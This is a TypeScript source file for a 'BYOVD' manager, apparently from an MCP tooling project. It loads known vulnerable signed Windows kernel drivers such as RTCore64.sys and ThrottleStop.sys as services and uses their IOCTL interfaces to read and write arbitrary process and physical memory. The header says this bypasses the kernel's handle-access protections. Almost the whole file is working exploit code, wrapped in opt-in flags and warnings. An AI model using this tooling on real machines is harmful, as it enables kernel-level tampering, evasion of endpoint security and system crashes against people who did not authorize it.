/**
 * BYOVD Manager — load, operate, and unload vulnerable kernel drivers.
 *
 * Provides kernel-level memory R/W by exploiting IOCTL interfaces of
 * legitimate signed-but-vulnerable drivers.  Bypasses ObRegisterCallbacks
 * restrictions that strip PROCESS_VM_READ|WRITE from user-mode handles.
 *
 * ## Safety Gates
 * - JSHOOK_BYOVD_ENABLE=1 required
 * - Administrator privileges required
 * - Driver SHA-256 verified before loading (when hash is known)
 * - Rate-limited IOCTL calls to prevent BSOD
 * - Auto-unload on MCP server shutdown
 * - NO DRIVER BINARIES ARE BUNDLED
 *
 * ## WARNING
 * Loading kernel drivers is inherently risky.  May cause BSOD,
 * system instability, or trigger EDR alerts.  Only for authorized
 * security testing and research.
 *
 * @module byovd/ByovdManager
 */

import { createHash } from 'node:crypto';
import { createReadStream } from 'node:fs';
import type { LibraryHandle } from 'koffi';
import { requireKoffi } from '../koffi-loader';
import { logger } from '@utils/logger';
import { DLL, ds } from '@utils/obfuscated-strings';
import {
  BYOVD_ENABLED,
  BYOVD_MAX_IOCTL_PER_SEC,
  BYOVD_MAX_READ_BYTES,
  BYOVD_MAX_WRITE_BYTES,
  BYOVD_PHYSICAL_CHUNK_SIZE,
} from '@src/constants';
import type {
  ByovdDriverDef,
  ByovdActiveDriver,
  ByovdReadResult,
  ByovdWriteResult,
  ByovdStatusReport,
  ByovdDriverSummary,
} from './types';
import { findDriver, byovdDriverRegistry } from './drivers';

// ── Library Loading (lazy, matching Win32API.ts pattern) ──

let advapi32Lib: LibraryHandle | null = null;
let kernel32Lib: LibraryHandle | null = null;

function getAdvapi32(): LibraryHandle {
  if (!advapi32Lib) {
    advapi32Lib = requireKoffi().load(ds(DLL.advapi32));
    logger.debug('Loaded advapi32.dll via koffi (BYOVD)');
  }
  return advapi32Lib;
}

function getKernel32(): LibraryHandle {
  if (!kernel32Lib) {
    kernel32Lib = requireKoffi().load(ds(DLL.kernel32));
    logger.debug('Loaded kernel32.dll via koffi (BYOVD)');
  }
  return kernel32Lib;
}

// ── Win32 Constants ──

const SC_MANAGER_ALL_ACCESS = 0xf003f;
const SERVICE_KERNEL_DRIVER = 0x00000001;
const SERVICE_DEMAND_START = 0x00000003;
const SERVICE_ERROR_NORMAL = 0x00000001;
const SERVICE_CONTROL_STOP = 0x00000001;
const GENERIC_READ = 0x80000000;
const GENERIC_WRITE = 0x40000000;
const FILE_SHARE_READ = 0x00000001;
const FILE_SHARE_WRITE = 0x00000002;
const OPEN_EXISTING = 3;
const FILE_ATTRIBUTE_NORMAL = 0x80;
const FILE_FLAG_OVERLAPPED = 0x40000000;

// ── Service Control Manager FFI ──

function advOpenSCManager(
  machineName: string | null,
  databaseName: string | null,
  desiredAccess: number,
): bigint {
  const fn = getAdvapi32().func('void * OpenSCManagerA(char *, char *, uint32)');
  const result = fn(machineName, databaseName, desiredAccess);
  return typeof result === 'bigint' ? result : BigInt(result as number | string);
}

function advCreateService(
  scmHandle: bigint,
  serviceName: string,
  displayName: string,
  desiredAccess: number,
  serviceType: number,
  startType: number,
  errorControl: number,
  binaryPath: string,
  loadOrderGroup: string | null,
  tagId: number | null,
  dependencies: string | null,
  serviceStartName: string | null,
  password: string | null,
): bigint {
  const fn = getAdvapi32().func(
    'void * CreateServiceA(void *, char *, char *, uint32, uint32, uint32, uint32, char *, char *, void *, char *, char *, char *)',
  );
  const result = fn(
    scmHandle,
    serviceName,
    displayName,
    desiredAccess,
    serviceType,
    startType,
    errorControl,
    binaryPath,
    loadOrderGroup,
    tagId,
    dependencies,
    serviceStartName,
    password,
  );
  return typeof result === 'bigint' ? result : BigInt(result as number | string);
}

function advStartService(serviceHandle: bigint, argc: number, argv: null): boolean {
  const fn = getAdvapi32().func('int StartServiceA(void *, uint32, void *)');
  return fn(serviceHandle, argc, argv) !== 0;
}

function advControlService(
  serviceHandle: bigint,
  control: number,
): { success: boolean; currentState: number } {
  const fn = getAdvapi32().func('int ControlService(void *, uint32, _Out_ uint8_t *)');
  const statusBuf = Buffer.alloc(28); // SERVICE_STATUS is 28 bytes
  const result = fn(serviceHandle, control, statusBuf);
  if (result === 0) {
    return { success: false, currentState: 0 };
  }
  return { success: true, currentState: statusBuf.readUInt32LE(4) };
}

function advDeleteService(serviceHandle: bigint): boolean {
  const fn = getAdvapi32().func('int DeleteService(void *)');
  return fn(serviceHandle) !== 0;
}

function advCloseServiceHandle(handle: bigint): boolean {
  const fn = getAdvapi32().func('int CloseServiceHandle(void *)');
  return fn(handle) !== 0;
}

// ── kernel32 FFI ──

function kernCreateFileW(
  devicePath: string,
  desiredAccess: number,
  shareMode: number,
  creationDisposition: number,
  flags: number,
): bigint {
  const fn = getKernel32().func(
    'void * CreateFileW(str, uint32, uint32, void *, uint32, uint32, void *)',
  );
  const result = fn(devicePath, desiredAccess, shareMode, null, creationDisposition, flags, null);
  return typeof result === 'bigint' ? result : BigInt(result as number | string);
}

function kernCloseHandle(handle: bigint): boolean {
  const fn = getKernel32().func('int CloseHandle(void *)');
  return fn(handle) !== 0;
}

function kernDeviceIoControl(
  deviceHandle: bigint,
  ioctlCode: number,
  inputBuffer: Buffer | null,
  outputBuffer: Buffer | null,
): { success: boolean; bytesReturned: number; lastError: number } {
  const fn = getKernel32().func(
    'int DeviceIoControl(void *, uint32, void *, uint32, void *, uint32, _Out_ uint32 *, void *)',
  );
  const bytesReturnedBuf = Buffer.alloc(4);
  const inPtr = inputBuffer ? requireKoffi().address(inputBuffer) : null;
  const outPtr = outputBuffer ? requireKoffi().address(outputBuffer) : null;
  const inSize = inputBuffer ? inputBuffer.length : 0;
  const outSize = outputBuffer ? outputBuffer.length : 0;

  const result = fn(
    deviceHandle,
    ioctlCode,
    inPtr,
    inSize,
    outPtr,
    outSize,
    bytesReturnedBuf,
    null,
  );

  return {
    success: result !== 0,
    bytesReturned: bytesReturnedBuf.readUInt32LE(0),
    lastError: result === 0 ? getLastWin32Error() : 0,
  };
}

function getLastWin32Error(): number {
  const fn = getKernel32().func('uint32 GetLastError()');
  return fn();
}

// ── Admin Check ──

function isAdmin(): boolean {
  if (process.platform !== 'win32') return false;
  try {
    // Check via shellapi — isUserAnAdmin equivalent
    const shell32 = requireKoffi().load(ds(DLL.shell32));
    const fn = shell32.func('int IsUserAnAdmin()');
    const result = fn();
    shell32.unload();
    return result !== 0;
  } catch {
    // Fallback: try to open SCM — if we can, we're admin
    try {
      const hScm = advOpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
      if (hScm !== 0n) {
        advCloseServiceHandle(hScm);
        return true;
      }
    } catch {
      // ignore
    }
    return false;
  }
}

// ── Rate Limiter ──

class IoctlRateLimiter {
  private timestamps: number[] = [];
  private readonly maxPerSec: number;

  constructor(maxPerSec: number) {
    this.maxPerSec = maxPerSec;
  }

  async wait(): Promise<void> {
    const now = Date.now();
    // Remove entries older than 1 second
    this.timestamps = this.timestamps.filter((t) => now - t < 1000);
    if (this.timestamps.length >= this.maxPerSec) {
      const oldest = this.timestamps[0]!;
      const waitMs = 1000 - (now - oldest) + 1;
      if (waitMs > 0) {
        logger.debug(`BYOVD rate limit: waiting ${waitMs}ms`);
        await new Promise((r) => setTimeout(r, waitMs));
      }
    }
    this.timestamps.push(Date.now());
  }

  reset(): void {
    this.timestamps = [];
  }
}

// ── ByovdManager ──

export class ByovdManager {
  private active: ByovdActiveDriver | null = null;
  private rateLimiter = new IoctlRateLimiter(BYOVD_MAX_IOCTL_PER_SEC);
  private unloaded = false;

  /** Check if BYOVD is available on this system. */
  checkAvailability(): { available: boolean; reason?: string } {
    if (!BYOVD_ENABLED) {
      return { available: false, reason: 'JSHOOK_BYOVD_ENABLE is not set to 1' };
    }
    if (process.platform !== 'win32') {
      return { available: false, reason: 'BYOVD only supported on Windows' };
    }
    if (!isAdmin()) {
      return { available: false, reason: 'Administrator privileges required' };
    }
    return { available: true };
  }

  /** Get the current status report. */
  getStatus(): ByovdStatusReport {
    return {
      enabled: BYOVD_ENABLED,
      active: this.active !== null,
      driverName: this.active?.driver.name ?? null,
      driverVersion: this.active?.driver.version ?? null,
      loadedAt: this.active?.loadedAt ?? null,
      capabilities: this.active?.driver.capabilities ?? null,
      cve: this.active?.driver.cve ?? null,
      isAdmin: isAdmin(),
      platform: process.platform,
    };
  }

  /** List all registered driver definitions with their current status. */
  listDrivers(): ByovdDriverSummary[] {
    return byovdDriverRegistry.map((d) => ({
      name: d.name,
      version: d.version,
      status: d.status,
      capabilities: [...d.capabilities],
      cve: [...d.cve],
      physicalMemory: d.physicalMemory,
      description: d.description,
    }));
  }

  /**
   * Load and start a BYOVD kernel driver.
   *
   * Steps:
   *   1. Validate environment (admin + BYOVD enabled)
   *   2. Verify driver binary SHA-256 (when known)
   *   3. Register kernel service via SCM
   *   4. Start the service
   *   5. Open device handle via CreateFile
   *   6. Test IOCTL with a self-read
   */
  async loadDriver(driverName: string): Promise<{ success: boolean; error?: string }> {
    if (this.unloaded) {
      return { success: false, error: 'ByovdManager has been shut down — create a new instance' };
    }

    // Gate 1: BYOVD enabled
    if (!BYOVD_ENABLED) {
      return {
        success: false,
        error:
          'BYOVD not enabled. Set JSHOOK_BYOVD_ENABLE=1 to enable. ' +
          'WARNING: Loading kernel drivers may cause BSOD. Only for authorized testing.',
      };
    }

    // Gate 2: Platform
    if (process.platform !== 'win32') {
      return { success: false, error: 'BYOVD only supported on Windows' };
    }

    // Gate 3: Admin
    if (!isAdmin()) {
      return { success: false, error: 'Administrator privileges required to load kernel drivers' };
    }

    // Gate 4: Already loaded
    if (this.active) {
      return {
        success: false,
        error: `Driver "${this.active.driver.name}" is already loaded. Unload it first.`,
      };
    }

    // Gate 5: Find driver def
    const driver = findDriver(driverName);
    if (!driver) {
      return {
        success: false,
        error: `Unknown driver "${driverName}". Use listDrivers() to see available drivers.`,
      };
    }

    // Gate 6: Blocklist check (advisory)
    if (driver.status === 'blocklisted') {
      logger.warn(
        `BYOVD: ${driver.name} is blocklisted by Microsoft. It may not load on HVCI-enabled systems.`,
      );
    }

    // Gate 6: Verify driver hash (BLOCKING: skip if no hash known)
    const hashOk = await this.verifyDriverHash(driver);
    if (!hashOk) {
      return {
        success: false,
        error:
          `SHA-256 verification failed for ${driver.name}. ` +
          'The driver binary does not match the expected hash. ' +
          'This may indicate a tampered or incorrect binary.',
      };
    }

    return this.doLoad(driver);
  }

  /**
   * Verify the SHA-256 hash of a driver binary against the known-good hash.
   *
   * Uses streaming reads to avoid loading large binaries into memory.
   * If no hash is known (empty or all-zero placeholder), logs a warning
   * but allows the load to proceed.
   *
   * @returns true if hash matches or no hash is known, false on mismatch.
   */
  private async verifyDriverHash(driver: ByovdDriverDef): Promise<boolean> {
    const expected = driver.sha256;

    // No hash known — allow but warn
    if (!expected || /^0{64}$/.test(expected)) {
      logger.warn(
        `BYOVD: No SHA-256 hash known for ${driver.name} — ` +
          'skipping binary verification. Set a known hash in the driver definition.',
      );
      return true;
    }

    try {
      const computed = await new Promise<string>((resolve, reject) => {
        const hash = createHash('sha256');
        const stream = createReadStream(driver.binaryPath);
        stream.on('data', (chunk: Buffer) => hash.update(chunk));
        stream.on('end', () => resolve(hash.digest('hex')));
        stream.on('error', reject);
      });

      if (computed.toLowerCase() !== expected.toLowerCase()) {
        logger.error(
          `BYOVD: SHA-256 MISMATCH for ${driver.name}\n` +
            `  Expected: ${expected}\n` +
            `  Got:      ${computed}`,
        );
        return false;
      }

      logger.debug(`BYOVD: SHA-256 verified for ${driver.name}`);
      return true;
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      logger.error(`BYOVD: Failed to verify hash for ${driver.name}: ${msg}`);
      return false;
    }
  }

  private async doLoad(driver: ByovdDriverDef): Promise<{ success: boolean; error?: string }> {
    let scmHandle: bigint = 0n;
    let serviceHandle: bigint = 0n;
    let deviceHandle: bigint = 0n;

    try {
      // Step 1: Open SCM
      scmHandle = advOpenSCManager(null, null, SC_MANAGER_ALL_ACCESS);
      if (scmHandle === 0n) {
        const err = getLastWin32Error();
        logger.error(`BYOVD: OpenSCManager failed: 0x${err.toString(16)}`);
        return { success: false, error: `OpenSCManager failed (0x${err.toString(16)})` };
      }

      // Step 2: Create kernel service
      serviceHandle = advCreateService(
        scmHandle,
        driver.serviceName,
        driver.name,
        SC_MANAGER_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driver.binaryPath, // filesystem path to .sys file
        null, // load order group
        null, // tag id
        null, // dependencies
        null, // service start name
        null, // password
      );

      const lastErr = getLastWin32Error();
      // ERROR_SERVICE_EXISTS (0x431) is acceptable — the service was already installed
      if (serviceHandle === 0n && lastErr !== 0x431) {
        logger.error(`BYOVD: CreateService failed: 0x${lastErr.toString(16)}`);
        return { success: false, error: `CreateService failed (0x${lastErr.toString(16)})` };
      }
      if (serviceHandle === 0n) {
        logger.warn(
          `BYOVD: ${driver.serviceName} service already exists (ERROR_SERVICE_EXISTS). ` +
            'Attempting to use existing service.',
        );
        // The service exists — we cannot proceed without a service handle.
        // The user must manually unload the existing service first, or use sc.exe.
        return {
          success: false,
          error:
            `Service ${driver.serviceName} already exists. Remove it first: ` +
            `sc delete ${driver.serviceName}`,
        };
      }

      // Step 3: Start the service
      const started = advStartService(serviceHandle, 0, null);
      if (!started) {
        const startErr = getLastWin32Error();
        logger.error(`BYOVD: StartService failed: 0x${startErr.toString(16)}`);
        advDeleteService(serviceHandle);
        advCloseServiceHandle(serviceHandle);
        return { success: false, error: `StartService failed (0x${startErr.toString(16)})` };
      }

      // Step 4: Open device handle
      deviceHandle = kernCreateFileW(
        driver.devicePath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
      );

      if (deviceHandle === 0n || deviceHandle === BigInt(-1)) {
        const openErr = getLastWin32Error();
        logger.error(
          `BYOVD: CreateFile for ${driver.devicePath} failed: 0x${openErr.toString(16)}`,
        );
        // Try to stop + delete the service
        advControlService(serviceHandle, SERVICE_CONTROL_STOP);
        advDeleteService(serviceHandle);
        advCloseServiceHandle(serviceHandle);
        return {
          success: false,
          error:
            `CreateFile for ${driver.devicePath} failed (0x${openErr.toString(16)}). ` +
            'Is the driver installed at the expected path?',
        };
      }

      // Step 5: Verify IOCTL works with a self-test read
      const testOk = await this.testIoctl(deviceHandle, driver);
      if (!testOk) {
        logger.error('BYOVD: IOCTL self-test failed — driver may not be functional');
        kernCloseHandle(deviceHandle);
        advControlService(serviceHandle, SERVICE_CONTROL_STOP);
        advDeleteService(serviceHandle);
        advCloseServiceHandle(serviceHandle);
        return { success: false, error: 'IOCTL self-test failed' };
      }

      // Success
      this.active = {
        driver,
        deviceHandle,
        serviceHandle,
        loadedAt: Date.now(),
      };

      // Register shutdown handler
      this.registerShutdown();

      logger.info(
        `BYOVD: Loaded ${driver.name} v${driver.version} ` +
          `(CVE: ${driver.cve.join(', ') || 'none'}). ` +
          'Kernel memory R/W is now active.',
      );

      return { success: true };
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      logger.error(`BYOVD: loadDriver failed: ${msg}`);

      // Cleanup on error
      try {
        if (deviceHandle !== 0n && deviceHandle !== BigInt(-1)) kernCloseHandle(deviceHandle);
      } catch {
        /* best-effort */
      }
      try {
        if (serviceHandle !== 0n) {
          advControlService(serviceHandle, SERVICE_CONTROL_STOP);
          advDeleteService(serviceHandle);
          advCloseServiceHandle(serviceHandle);
        }
      } catch {
        /* best-effort */
      }
      try {
        if (scmHandle !== 0n) advCloseServiceHandle(scmHandle);
      } catch {
        /* best-effort */
      }

      return { success: false, error: msg };
    }
  }

  /** Quick self-test: read a small amount of our own process memory. */
  private async testIoctl(deviceHandle: bigint, driver: ByovdDriverDef): Promise<boolean> {
    try {
      const testAddr = BigInt(0x7ffe0000); // KUSER_SHARED_DATA (readable in all processes)
      const result = await this.readPhysicalChunked(deviceHandle, driver, testAddr, 8);
      return result.success && result.bytesRead > 0;
    } catch {
      return false;
    }
  }

  /**
   * Read virtual memory from a target process via the loaded kernel driver.
   *
   * For virtual-memory drivers, this sends the PID + virtual address.
   * For physical-memory drivers, this translates VA→PA first, then reads
   * physical memory in 8-byte chunks.
   */
  async readVirtualMemory(
    targetPid: number,
    address: bigint,
    size: number,
  ): Promise<ByovdReadResult> {
    if (!this.active) {
      return { success: false, error: 'No BYOVD driver loaded', bytesRead: 0 };
    }
    if (size <= 0) {
      return { success: false, error: 'Size must be positive', bytesRead: 0 };
    }
    if (size > BYOVD_MAX_READ_BYTES) {
      return {
        success: false,
        error: `Read size ${size} exceeds maximum ${BYOVD_MAX_READ_BYTES}`,
        bytesRead: 0,
      };
    }

    await this.rateLimiter.wait();

    const { driver, deviceHandle } = this.active;

    try {
      if (driver.physicalMemory) {
        return await this.readPhysicalChunked(deviceHandle, driver, address, size);
      }
      return this.readVirtual(deviceHandle, driver, targetPid, address, size);
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      return { success: false, error: msg, bytesRead: 0 };
    }
  }

  /** Virtual-memory read (non-physical-memory driver path). */
  private readVirtual(
    deviceHandle: bigint,
    driver: ByovdDriverDef,
    pid: number,
    address: bigint,
    size: number,
  ): ByovdReadResult {
    // Build input buffer: [pid:u32, padding:u32, address:u64, size:u32, padding:u32]
    const inputBuf = Buffer.alloc(24);
    inputBuf.writeUInt32LE(pid, 0);
    inputBuf.writeBigUInt64LE(address, 8);
    inputBuf.writeUInt32LE(size, 16);

    const outputBuf = Buffer.alloc(size);
    const ioctlResult = kernDeviceIoControl(
      deviceHandle,
      driver.ioctlReadMemory,
      inputBuf,
      outputBuf,
    );

    if (!ioctlResult.success) {
      return {
        success: false,
        error: `DeviceIoControl(0x${driver.ioctlReadMemory.toString(16)}) failed: 0x${ioctlResult.lastError.toString(16)}`,
        bytesRead: 0,
      };
    }

    return {
      success: true,
      data: outputBuf.subarray(0, ioctlResult.bytesReturned),
      bytesRead: ioctlResult.bytesReturned,
    };
  }

  /**
   * Physical-memory read — reads in 8-byte (qword) chunks.
   *
   * ThrottleStop.sys and RTCore64.sys both map physical memory via
   * MmMapIoSpace.  The IOCTL takes a physical address and returns
   * the data at that address.  For reads larger than 8 bytes, we
   * chunk and reassemble.
   */
  private async readPhysicalChunked(
    deviceHandle: bigint,
    driver: ByovdDriverDef,
    physicalAddress: bigint,
    totalSize: number,
  ): Promise<ByovdReadResult> {
    const chunkSize = BYOVD_PHYSICAL_CHUNK_SIZE;
    const result = Buffer.alloc(totalSize);
    let bytesRead = 0;

    for (let offset = 0; offset < totalSize; offset += chunkSize) {
      const remaining = totalSize - offset;
      const thisChunk = Math.min(chunkSize, remaining);
      const physAddr = physicalAddress + BigInt(offset);

      const inputBuf = this.buildPhysicalInput(driver, physAddr, thisChunk);
      const outputBuf = Buffer.alloc(thisChunk);

      await this.rateLimiter.wait();

      const ioctlResult = kernDeviceIoControl(
        deviceHandle,
        driver.ioctlReadMemory,
        inputBuf,
        outputBuf,
      );

      if (!ioctlResult.success) {
        return {
          success: false,
          error: `DeviceIoControl read at phys 0x${physAddr.toString(16)} failed (offset ${offset})`,
          bytesRead,
        };
      }

      const data = outputBuf.subarray(0, ioctlResult.bytesReturned || thisChunk);
      data.copy(result, offset);
      bytesRead += data.length;
    }

    return { success: true, data: result.subarray(0, bytesRead), bytesRead };
  }

  /**
   * Write virtual memory to a target process via the loaded kernel driver.
   */
  async writeVirtualMemory(
    targetPid: number,
    address: bigint,
    data: Buffer,
  ): Promise<ByovdWriteResult> {
    if (!this.active) {
      return { success: false, error: 'No BYOVD driver loaded', bytesWritten: 0 };
    }
    if (data.length > BYOVD_MAX_WRITE_BYTES) {
      return {
        success: false,
        error: `Write size ${data.length} exceeds maximum ${BYOVD_MAX_WRITE_BYTES}`,
        bytesWritten: 0,
      };
    }

    await this.rateLimiter.wait();

    const { driver, deviceHandle } = this.active;

    try {
      if (driver.physicalMemory) {
        return await this.writePhysicalChunked(deviceHandle, driver, address, data);
      }
      return this.writeVirtual(deviceHandle, driver, targetPid, address, data);
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      return { success: false, error: msg, bytesWritten: 0 };
    }
  }

  private writeVirtual(
    deviceHandle: bigint,
    driver: ByovdDriverDef,
    pid: number,
    address: bigint,
    data: Buffer,
  ): ByovdWriteResult {
    const inputBuf = Buffer.alloc(24 + data.length);
    inputBuf.writeUInt32LE(pid, 0);
    inputBuf.writeBigUInt64LE(address, 8);
    inputBuf.writeUInt32LE(data.length, 16);
    data.copy(inputBuf, 24);

    const ioctlResult = kernDeviceIoControl(deviceHandle, driver.ioctlWriteMemory, inputBuf, null);

    if (!ioctlResult.success) {
      return {
        success: false,
        error: `DeviceIoControl write (0x${driver.ioctlWriteMemory.toString(16)}) failed: 0x${ioctlResult.lastError.toString(16)}`,
        bytesWritten: 0,
      };
    }

    return { success: true, bytesWritten: data.length };
  }

  private async writePhysicalChunked(
    deviceHandle: bigint,
    driver: ByovdDriverDef,
    physicalAddress: bigint,
    data: Buffer,
  ): Promise<ByovdWriteResult> {
    const chunkSize = BYOVD_PHYSICAL_CHUNK_SIZE;
    let bytesWritten = 0;

    for (let offset = 0; offset < data.length; offset += chunkSize) {
      const chunk = data.subarray(offset, Math.min(offset + chunkSize, data.length));
      const physAddr = physicalAddress + BigInt(offset);

      const inputBuf = this.buildPhysicalInput(driver, physAddr, chunk.length);
      // For writes, append the data after the address/size header
      const writeBuf = Buffer.alloc(inputBuf.length + chunk.length);
      inputBuf.copy(writeBuf);
      chunk.copy(writeBuf, inputBuf.length);

      await this.rateLimiter.wait();

      const ioctlResult = kernDeviceIoControl(
        deviceHandle,
        driver.ioctlWriteMemory,
        writeBuf,
        null,
      );

      if (!ioctlResult.success) {
        return {
          success: false,
          error: `DeviceIoControl write at phys 0x${physAddr.toString(16)} failed (offset ${offset})`,
          bytesWritten,
        };
      }

      bytesWritten += chunk.length;
    }

    return { success: true, bytesWritten };
  }

  /**
   * Build the input buffer for a physical-memory IOCTL.
   *
   * Variable per-driver: some drivers encode the size in the IOCTL code
   * itself (ThrottleStop uses different IOCTLs for 1/2/4/8 bytes).
   * Others (RTCore64) take address+size in a struct.
   *
   * We use a generic 16-byte struct: [physicalAddress:u64, size:u32, padding:u32].
   */
  private buildPhysicalInput(
    _driver: ByovdDriverDef,
    physicalAddress: bigint,
    size: number,
  ): Buffer {
    const buf = Buffer.alloc(16);
    buf.writeBigUInt64LE(physicalAddress, 0);
    buf.writeUInt32LE(size, 8);
    return buf;
  }

  /**
   * Unload the active BYOVD driver and clean up all handles.
   */
  async unloadDriver(): Promise<{ success: boolean; error?: string }> {
    if (!this.active) {
      return { success: false, error: 'No BYOVD driver loaded' };
    }

    const { driver, deviceHandle, serviceHandle } = this.active;

    try {
      // Step 1: Close device handle
      if (deviceHandle !== 0n && deviceHandle !== BigInt(-1)) {
        kernCloseHandle(deviceHandle);
      }

      // Step 2: Stop the service
      const stopResult = advControlService(serviceHandle, SERVICE_CONTROL_STOP);
      if (!stopResult.success) {
        logger.warn(`BYOVD: ControlService(STOP) for ${driver.name} may have failed`);
      }

      // Step 3: Delete the service
      advDeleteService(serviceHandle);

      // Step 4: Close service handle
      advCloseServiceHandle(serviceHandle);

      this.active = null;
      this.rateLimiter.reset();

      logger.info(`BYOVD: Unloaded ${driver.name}. Kernel memory R/W disabled.`);

      return { success: true };
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      logger.error(`BYOVD: unloadDriver failed: ${msg}`);
      return { success: false, error: msg };
    }
  }

  /** Check if a BYOVD driver is currently loaded and active. */
  isActive(): boolean {
    return this.active !== null;
  }

  /** Get the active driver definition (null if no driver loaded). */
  getActiveDriver(): ByovdActiveDriver | null {
    return this.active;
  }

  /**
   * Read from physical memory via the active driver's IOCTL.
   *
   * Physical-memory drivers only (ThrottleStop.sys, RTCore64.sys).
   * For virtual-memory drivers, this throws. The caller is responsible
   * for translating virtual addresses to physical addresses before
   * calling this method.
   *
   * Rate-limited internally (max IOCTL/sec configurable).
   */
  async readPhysicalMemory(physicalAddress: bigint, size: number): Promise<ByovdReadResult> {
    if (!this.active) {
      return { success: false, error: 'No BYOVD driver loaded', bytesRead: 0 };
    }
    if (size <= 0) {
      return { success: false, error: 'Size must be positive', bytesRead: 0 };
    }
    if (!this.active.driver.physicalMemory) {
      return {
        success: false,
        error: `Driver "${this.active.driver.name}" does not support physical memory access`,
        bytesRead: 0,
      };
    }
    if (size > BYOVD_MAX_READ_BYTES) {
      return {
        success: false,
        error: `Read size ${size} exceeds maximum ${BYOVD_MAX_READ_BYTES}`,
        bytesRead: 0,
      };
    }

    return this.readPhysicalChunked(
      this.active.deviceHandle,
      this.active.driver,
      physicalAddress,
      size,
    );
  }

  /**
   * Write to physical memory via the active driver's IOCTL.
   *
   * Physical-memory drivers only. The caller must translate virtual
   * addresses to physical addresses before calling.
   */
  async writePhysicalMemory(physicalAddress: bigint, data: Buffer): Promise<ByovdWriteResult> {
    if (!this.active) {
      return { success: false, error: 'No BYOVD driver loaded', bytesWritten: 0 };
    }
    if (!this.active.driver.physicalMemory) {
      return {
        success: false,
        error: `Driver "${this.active.driver.name}" does not support physical memory access`,
        bytesWritten: 0,
      };
    }
    if (data.length > BYOVD_MAX_WRITE_BYTES) {
      return {
        success: false,
        error: `Write size ${data.length} exceeds maximum ${BYOVD_MAX_WRITE_BYTES}`,
        bytesWritten: 0,
      };
    }

    return this.writePhysicalChunked(
      this.active.deviceHandle,
      this.active.driver,
      physicalAddress,
      data,
    );
  }

  /**
   * Full shutdown — unload driver and mark as unloaded.
   * After this call, create a new instance to use BYOVD again.
   */
  async shutdown(): Promise<void> {
    if (this.active) {
      try {
        await this.unloadDriver();
      } catch {
        // best-effort
      }
    }
    this.unloaded = true;
  }

  private shutdownRegistered = false;

  private registerShutdown(): void {
    if (this.shutdownRegistered) return;
    this.shutdownRegistered = true;

    const shutdownHandler = () => {
      if (this.active) {
        logger.warn('BYOVD: Auto-unloading driver on process exit');
        try {
          if (this.active.deviceHandle !== 0n) kernCloseHandle(this.active.deviceHandle);
          advControlService(this.active.serviceHandle, SERVICE_CONTROL_STOP);
          advDeleteService(this.active.serviceHandle);
          advCloseServiceHandle(this.active.serviceHandle);
        } catch {
          // best-effort on shutdown
        }
      }
    };

    process.on('exit', shutdownHandler);
    process.on('SIGINT', shutdownHandler);
    process.on('SIGTERM', shutdownHandler);
  }
}

/** Singleton ByovdManager instance. */
export const byovdManager = new ByovdManager();
